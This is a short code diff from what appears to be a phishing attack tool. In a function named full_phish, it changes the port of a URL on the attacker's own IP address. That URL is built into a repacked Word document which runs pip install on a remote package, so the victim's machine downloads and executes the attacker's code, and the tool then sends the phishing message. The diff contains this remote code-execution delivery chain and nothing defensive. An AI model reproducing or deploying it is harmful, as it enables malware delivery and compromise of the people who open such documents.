@@ -34,7 +34,7 @@ def full_phish(cmd):
     print(contents.decode())
 
     print("Baseline worked.. running real command..")
-    url = "http://{}:8080/foo-1.0.tar.gz".format(my_ip)
+    url = "http://{}:8888/foo-1.0.tar.gz".format(my_ip)
     repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install {}".format(url))
     phish.phish()
 
